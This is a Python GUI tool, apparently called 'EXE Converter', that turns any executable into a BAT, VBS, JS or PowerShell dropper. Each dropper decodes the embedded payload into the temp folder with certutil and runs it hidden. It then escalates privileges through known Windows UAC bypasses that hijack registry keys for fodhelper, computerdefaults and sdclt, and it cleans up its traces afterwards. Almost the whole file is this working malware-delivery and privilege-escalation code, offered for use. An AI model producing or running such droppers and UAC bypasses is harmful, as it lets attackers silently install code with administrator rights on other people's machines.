import tkinter as tk
from tkinter import filedialog, messagebox, PhotoImage
import base64
import os
import webbrowser

# Try to import PIL for better image handling
try:
    from PIL import Image, ImageTk
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

class ExeConverter:
    @staticmethod
    def exe_to_bat(exe_bytes, uac_method="fodhelper"):
        b64 = base64.b64encode(exe_bytes).decode('utf-8')
        chunks = [b64[i:i+70] for i in range(0, len(b64), 70)]
        
        echos = []
        for i, chunk in enumerate(chunks):
            if i == 0:
                echos.append(f"echo {chunk}>%tmp%\\app_data")
            else:
                echos.append(f"echo {chunk}>>%tmp%\\app_data")
        
        # Common BAT template parts
        common_template = r"""@echo off
{echos}

:: Decode the executable
certutil -decode %tmp%\app_data %tmp%\sys_file >nul
if not exist "%tmp%\sys_file" (
    exit /b 1
)

:: Check if already admin
net session >nul 2>&1
if %errorlevel% == 0 (
    start "" "%tmp%\sys_file" >nul 2>&1
    exit /b
)
"""
        # UAC Method templates
        uac_templates = {
            "fodhelper": r"""
:: Fodhelper UAC Bypass
powershell -Command "New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force >$null"
powershell -Command "New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Force >$null"
powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value '%tmp%\sys_file' -Force >$null"
timeout /t 65 >nul
start "" "fodhelper.exe" >nul 2>&1
timeout /t 10 >nul
powershell -Command "Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force >$null"
""",
            "computerdefaults": r"""
:: ComputerDefaults UAC Bypass
powershell -Command "New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force >$null"
powershell -Command "New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Force >$null"
powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value '%tmp%\sys_file' -Force >$null"
timeout /t 65 >nul
start "" "computerdefaults.exe" >nul 2>&1
timeout /t 10 >nul
powershell -Command "Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force >$null"
""",
            "sdclt": r"""
:: SDCLT UAC Bypass
reg add "HKCU\Software\Classes\Folder\shell\open\command" /ve /d "%tmp%\sys_file" /f >nul
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "DelegateExecute" /f >nul
timeout /t 65 >nul
start "" "sdclt.exe" >nul 2>&1
timeout /t 10 >nul
reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f >nul
"""
        }

        # Cleanup template
        cleanup_template = r"""
:: Cleanup
del "%tmp%\app_data" >nul
"""
        return (common_template + uac_templates[uac_method] + cleanup_template).format(echos='\n'.join(echos)).encode('utf-8')
        return bat_template.encode('utf-8')

    @staticmethod
    def exe_to_vbs(exe_bytes, uac_method="computerdefaults"):
        b64 = base64.b64encode(exe_bytes).decode('utf-8')
        
        # Common VBS template parts
        common_template = """
On Error Resume Next
Set fs = CreateObject("Scripting.FileSystemObject")
Set tmp = fs.GetSpecialFolder(2)
Set x = fs.CreateTextFile(tmp & "\\app_data", True)
x.Write "{b64}"
x.Close

Set shell = CreateObject("WScript.Shell")
shell.Run "certutil -decode " & tmp & "\\app_data " & tmp & "\\sys_file", 0, True
If Err.Number <> 0 Then
    WScript.Quit 1
End If

' Check if already admin
Set wsh = CreateObject("WScript.Shell")
wsh.Run "net session >nul 2>&1", 0, True
If Err.Number = 0 Then
    shell.Run tmp & "\\sys_file", 0, False
    WScript.Quit 0
End If
"""
        # UAC Method templates
        uac_templates = {
            "computerdefaults": """
' ComputerDefaults UAC Bypass
shell.RegWrite "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\", tmp & "\\sys_file", "REG_SZ"
shell.RegWrite "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute", "", "REG_SZ"
WScript.Sleep 20000
shell.Run "computerdefaults.exe", 0, False
WScript.Sleep 5000
shell.RegDelete "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\"
""",
            "fodhelper": """
' Fodhelper UAC Bypass
shell.RegWrite "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\", tmp & "\\sys_file", "REG_SZ"
shell.RegWrite "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute", "", "REG_SZ"
WScript.Sleep 20000
shell.Run "fodhelper.exe", 0, False
WScript.Sleep 5000
shell.RegDelete "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\"
""",
            "sdclt": """
' SDCLT UAC Bypass
shell.RegWrite "HKCU\\Software\\Classes\\Folder\\shell\\open\\command\\", tmp & "\\sys_file", "REG_SZ"
shell.RegWrite "HKCU\\Software\\Classes\\Folder\\shell\\open\\command\\DelegateExecute", "", "REG_SZ"
WScript.Sleep 20000
shell.Run "sdclt.exe", 0, False
WScript.Sleep 5000
shell.RegDelete "HKCU\\Software\\Classes\\Folder\\shell\\open\\command\\"
"""
        }
        
        # Cleanup template
        cleanup_template = """
' Cleanup
On Error Resume Next
fs.DeleteFile(tmp & "\\app_data")
fs.DeleteFile(tmp & "\\sys_file")
On Error Goto 0
"""
        return (common_template + uac_templates[uac_method] + cleanup_template).format(b64=b64).encode('utf-8')

    @staticmethod
    def exe_to_js(exe_bytes):
        b64 = base64.b64encode(exe_bytes).decode('utf-8')
        template = """
try {
    var fs = new ActiveXObject("Scripting.FileSystemObject");
    var tmp = fs.GetSpecialFolder(2);
    var x = fs.CreateTextFile(tmp + "\\\\app_data", true);
    x.Write("{b64}");
    x.Close();

    var shell = new ActiveXObject("WScript.Shell");
    shell.Run('certutil -decode ' + tmp + '\\\\app_data ' + tmp + '\\\\sys_file', 0, true);
    
    // Check if already admin
    var net = new ActiveXObject("WScript.Network");
    shell.Run("net session >nul 2>&1", 0, true);
    if (shell.ExitCode == 0) {
        shell.Run(tmp + "\\\\sys_file", 0, false);
        WScript.Quit(0);
    }

    // UAC Bypass
    shell.RegWrite("HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\", tmp + "\\\\sys_file", "REG_SZ");
    shell.RegWrite("HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\DelegateExecute", "", "REG_SZ");
    WScript.Sleep(65000);
    shell.Run("computerdefaults.exe", 0, false);
    WScript.Sleep(10000);
    shell.RegDelete("HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\");
} catch(e) {
    WScript.Quit(1);
}
"""
        return template.format(b64=b64).encode('utf-8')

    @staticmethod
    def exe_to_ps1(exe_bytes):
        b64 = base64.b64encode(exe_bytes).decode('utf-8')
        template = """
$bytes = [System.Convert]::FromBase64String("{b64}")
$tmp = [System.IO.Path]::GetTempPath()
[System.IO.File]::WriteAllBytes("$tmp\\sys_file", $bytes)

# Check if already admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    Start-Process "$tmp\\sys_file" -WindowStyle Hidden
    exit
}

# UAC Bypass
New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "(default)" -Value "$tmp\\sys_file" -Force
Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force
Start-Sleep -Seconds 65
Start-Process "computerdefaults.exe" -WindowStyle Hidden
Start-Sleep -Seconds 10
Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Recurse -Force -ErrorAction SilentlyContinue
"""
        return template.format(b64=b64).encode('utf-8')

class ExeConverterApp:
    def __init__(self, root):
        self.root = root
        self.root.title("EXE Converter By atulhack")
        self.root.geometry("600x500")
        self.root.configure(bg="#2c3e50")
        
        # Load icons
        self.icons = None
        try:
            if HAS_PIL:
                self.icons = {
                    "app": ImageTk.PhotoImage(Image.open("icon.png").resize((32,32))),
                    "convert": ImageTk.PhotoImage(Image.open("convert.png").resize((20,20))),
                    "format": ImageTk.PhotoImage(Image.open("format.png").resize((16,16))),
                    "github": ImageTk.PhotoImage(Image.open("github.png").resize((16,16))),
                    "keybase": ImageTk.PhotoImage(Image.open("keybase.png").resize((16,16))),
                    "telegram": ImageTk.PhotoImage(Image.open("telegram.png").resize((16,16))),
                    "blog": ImageTk.PhotoImage(Image.open("blog.png").resize((16,16)))
                }
                self.root.iconphoto(True, self.icons["app"])
            else:
                # Fallback to basic PhotoImage if PIL not available
                self.icons = {
                    "app": PhotoImage(file="icon.png"),
                    "convert": PhotoImage(file="convert.png"),
                    "format": PhotoImage(file="format.png"),
                    "github": PhotoImage(file="github.png"),
                    "keybase": PhotoImage(file="keybase.png"),
                    "telegram": PhotoImage(file="telegram.png"),
                    "blog": PhotoImage(file="blog.png")
                }
                self.root.iconphoto(True, self.icons["app"])
        except:
            self.icons = None
        
        # Style configuration
        self.style = {
            "bg": "#1e1e1e",
            "fg": "#f0f0f0",
            "accent": "#4CAF50",
            "card": "#2d2d2d",
            "success": "#4CAF50",
            "warning": "#FF9800",
            "error": "#F44336",
            "font": ("Segoe UI", 10),
            "title_font": ("Segoe UI", 18, "bold"),
            "button": {
                "bg": "#4CAF50",
                "fg": "white",
                "active": "#45a049",
                "font": ("Segoe UI", 10, "bold")
            }
        }
        
        # Main container
        self.main_container = tk.Frame(self.root, bg=self.style["bg"], padx=30, pady=30)
        self.main_container.pack(fill=tk.BOTH, expand=True)
        
        # Header section
        self.header_frame = tk.Frame(self.main_container, bg=self.style["bg"])
        self.header_frame.pack(fill=tk.X, pady=(0, 20))
        
        header_label = tk.Label(self.header_frame,
                text=" EXE Converter Pro",
                font=self.style["title_font"],
                bg=self.style["bg"],
                fg=self.style["fg"],
                compound=tk.LEFT)
        if self.icons:
            header_label.config(image=self.icons["app"], compound=tk.LEFT)
        header_label.pack(side=tk.LEFT)
        
        # Conversion card
        self.card_frame = tk.Frame(self.main_container,
                                 bg=self.style["card"],
                                 padx=20,
                                 pady=20,
                                 relief=tk.RAISED,
                                 bd=2)
        self.card_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 20))
        
        # Format and UAC method selection
        tk.Label(self.card_frame,
                text="CONVERSION SETTINGS",
                font=(self.style["font"][0], self.style["font"][1], "bold"),
                bg=self.style["card"],
                fg=self.style["accent"]).pack(anchor=tk.W, pady=(0, 10))
        
        # Format selection
        format_frame = tk.Frame(self.card_frame, bg=self.style["card"])
        format_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(format_frame,
                text="Output Format:",
                font=self.style["font"],
                bg=self.style["card"],
                fg=self.style["fg"]).pack(side=tk.LEFT, padx=(0, 10))
        
        self.format_var = tk.StringVar(value="exe -> bat")
        formats = ["exe -> bat", "exe -> vbs", "exe -> js", "exe -> ps1"]
        format_menu = tk.OptionMenu(format_frame, self.format_var, *formats)
        format_menu.config(font=self.style["font"],
                         bg="white",
                         fg="#2c3e50",
                         activebackground=self.style["accent"],
                         width=15)
        format_menu.pack(side=tk.LEFT)
        
        # UAC Method selection (only shown for BAT format)
        self.uac_frame = tk.Frame(self.card_frame, bg=self.style["card"])
        self.uac_frame.pack(fill=tk.X, pady=(0, 20))
        
        self.uac_label = tk.Label(self.uac_frame,
                                text="UAC Method:",
                                font=self.style["font"],
                                bg=self.style["card"],
                                fg=self.style["fg"])
        self.uac_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.uac_var = tk.StringVar(value="fodhelper")
        self.uac_methods = ["fodhelper", "computerdefaults", "sdclt"]
        self.uac_menu = tk.OptionMenu(self.uac_frame, self.uac_var, *self.uac_methods)
        self.uac_menu.config(font=self.style["font"],
                           bg="white",
                           fg="#2c3e50",
                           activebackground=self.style["accent"],
                           width=15)
        self.uac_menu.pack(side=tk.LEFT)
        
        # Hide UAC options initially (only show for BAT)
        self.uac_frame.pack_forget()
        
        # Update UAC visibility when format changes
        self.format_var.trace_add("write", self.update_uac_visibility)
        
        if self.icons:
            tk.Label(format_frame,
                   image=self.icons["format"],
                   bg=self.style["card"]).pack(side=tk.LEFT, padx=(0, 5))
        
        # Convert button
        self.convert_btn = tk.Button(self.card_frame,
                                   text=" CONVERT FILE",
                                   command=self.convert,
                                   font=(self.style["font"][0], self.style["font"][1], "bold"),
                                   bg=self.style["success"],
                                   fg="white",
                                   activebackground="#27ae60",
                                   padx=20,
                                   pady=8,
                                   bd=0,
                                   compound=tk.LEFT)
        if self.icons:
            self.convert_btn.config(image=self.icons["convert"], compound=tk.LEFT)
        self.convert_btn.pack(pady=10)
        
        # Footer with social links
        self.footer_frame = tk.Frame(self.main_container, bg=self.style["bg"])
        self.footer_frame.pack(side=tk.BOTTOM, fill=tk.X)
        
        tk.Label(self.footer_frame,
                text="CONNECT WITH ME:",
                font=(self.style["font"][0], self.style["font"][1], "bold"),
                bg=self.style["bg"],
                fg=self.style["fg"]).pack(side=tk.LEFT, padx=(0, 10))
        
        socials = [
            ("GitHub", "https://github.com/username"),
            ("Keybase", "https://keybase.io/username"),
            ("Telegram", "https://t.me/username"),
            ("Blog", "https://blog.example.com")
        ]
        
        for text, url in socials:
            btn = tk.Button(self.footer_frame,
                          text=f" {text}",
                          font=self.style["font"],
                          bg=self.style["accent"],
                          fg="white",
                          activebackground="#2980b9",
                          padx=8,
                          pady=4,
                          bd=0,
                          compound=tk.LEFT,
                          command=lambda u=url: webbrowser.open(u))
            if self.icons:
                btn.config(image=self.icons[text.lower()], compound=tk.LEFT)
            btn.pack(side=tk.LEFT, padx=5)
    
    def update_uac_visibility(self, *args):
        """Show/hide UAC method options based on selected format"""
        current_format = self.format_var.get()
        if current_format in ["exe -> bat", "exe -> vbs"]:
            self.uac_frame.pack(fill=tk.X, pady=(0, 20))
            
            # Update label text based on format
            if current_format == "exe -> bat":
                self.uac_label.config(text="UAC Method:")
            else:
                self.uac_label.config(text="VBS UAC Method:")
        else:
            self.uac_frame.pack_forget()

    def convert(self):
        # Open EXE file
        in_file = filedialog.askopenfilename(
            title="Select EXE file",
            filetypes=[("EXE files", "*.exe")],
            initialdir=os.path.expanduser("~/Desktop")
        )
        if not in_file:
            return
        
        # Read EXE file
        try:
            with open(in_file, 'rb') as f:
                exe_bytes = f.read()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to read file: {e}")
            return
        
        # Convert based on selected format
        format_idx = self.format_var.get()
        try:
            if format_idx == "exe -> bat":
                uac_method = self.uac_var.get()
                output = ExeConverter.exe_to_bat(exe_bytes, uac_method)
                ext = "bat"
            elif format_idx == "exe -> vbs":
                uac_method = self.uac_var.get()
                output = ExeConverter.exe_to_vbs(exe_bytes, uac_method)
                ext = "vbs"
            elif format_idx == "exe -> js":
                output = ExeConverter.exe_to_js(exe_bytes)
                ext = "js"
            elif format_idx == "exe -> ps1":
                output = ExeConverter.exe_to_ps1(exe_bytes)
                ext = "ps1"
            else:
                messagebox.showerror("Error", "Invalid format selected")
                return
        except Exception as e:
            messagebox.showerror("Error", f"Conversion failed: {e}")
            return
        
        # Save output file
        out_file = filedialog.asksaveasfilename(
            title="Save output file",
            defaultextension=f".{ext}",
            filetypes=[(f"{ext.upper()} files", f"*.{ext}")],
            initialdir=os.path.expanduser("~/Desktop")
        )
        if not out_file:
            return
        
        try:
            with open(out_file, 'wb') as f:
                f.write(output)
            messagebox.showinfo("Success", "File converted successfully!")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save file: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    try:
        root.iconbitmap("icon.ico")  # Add if you have an icon file
    except:
        pass
    app = ExeConverterApp(root)
    root.mainloop()